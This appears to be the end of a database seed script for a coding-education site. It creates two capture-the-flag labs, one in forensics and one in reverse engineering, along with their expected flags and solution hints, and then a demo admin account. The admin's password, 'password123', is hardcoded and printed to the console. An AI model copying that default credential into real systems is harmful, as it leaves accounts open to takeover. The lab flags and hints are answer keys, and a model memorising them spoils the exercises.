        toolsHint: 'Concepts: steganography, EXIF metadata, LSB encoding, file carving\nTools: exiftool, strings, binwalk, stegsolve, file\nYou do NOT need: any network access',
        phase: 5,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{m3t4d4t4_1s_k3y}',
        xpReward: 150,
        hintContent: 'Check the EXIF metadata carefully — look in the comment and user comment fields. Also try running strings on the file to see if anything is appended after the image data.',
        author: 'Zero to Dev',
        order: 5,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Reverse Engineering 101',
        slug: 'reverse-engineering-101',
        description: 'Reverse engineer a compiled binary to extract a secret flag obfuscated within the program logic.',
        briefingMdx: 'You have been given a compiled binary that contains a secret flag, but the flag is obfuscated within the program logic. The binary implements a custom encoding algorithm that transforms user input and compares it against a hardcoded expected value. Reverse the operation to extract the flag.',
        setupMdx: '# Download the binary\nwget https://zerotodev.dev/challenges/re-101/challenge\nchmod +x challenge\n\n# Analyze it\nfile challenge\nstrings challenge\nobjdump -d challenge | less',
        toolsHint: 'Concepts: disassembly, XOR encryption, control flow analysis\nTools: objdump, GDB, Ghidra, strings, file, radare2\nYou do NOT need: any network access',
        phase: 5,
        difficulty: 'hard',
        category: 'reversing',
        expectedFlag: 'ZTD{r3v3rs3_3ng1n33r1ng}',
        xpReward: 200,
        hintContent: 'The binary performs XOR encryption on the input and compares it to a hardcoded byte array. Use a disassembler to find the XOR key and the expected ciphertext, then reverse the operation.',
        author: 'Zero to Dev',
        order: 6,
      },
    }),
  ])

  console.log(`✅ Created ${labs.length} hacking labs.\n`)

  // ----------------------------------------------------------
  // 5. CREATE DEMO ADMIN USER
  // ----------------------------------------------------------
  console.log('👤 Creating demo admin user...')

  const hashedPassword = await hash('password123', 12)

  const adminUser = await db.user.create({
    data: {
      email: 'moe@zerotodev.dev',
      username: 'moe',
      passwordHash: hashedPassword,
      role: 'admin',
      xpTotal: 100,
      currentPhase: 1,
      streak: 0,
    },
  })

  console.log(`✅ Created admin user: ${adminUser.username} (${adminUser.email})\n`)

  // ----------------------------------------------------------
  // SUMMARY
  // ----------------------------------------------------------
  console.log('═══════════════════════════════════════════════════')
  console.log('  🎉 ZERO TO DEV — SEED COMPLETE!')
  console.log('═══════════════════════════════════════════════════')
  console.log(`  Phases:         ${phases.length}`)
  console.log(`  Lessons:        ${lessonCount}`)
  console.log(`  Exercises:      ${exerciseCount}`)
  console.log(`  Achievements:   ${achievements.length}`)
  console.log(`  Hacking Labs:   ${labs.length}`)
  console.log(`  Admin User:     moe@zerotodev.dev / password123`)
  console.log('═══════════════════════════════════════════════════\n')
}

main()
  .catch((e) => {
    console.error(e)
    process.exit(1)
  })
  .finally(async () => {
    await db.$disconnect()
  })
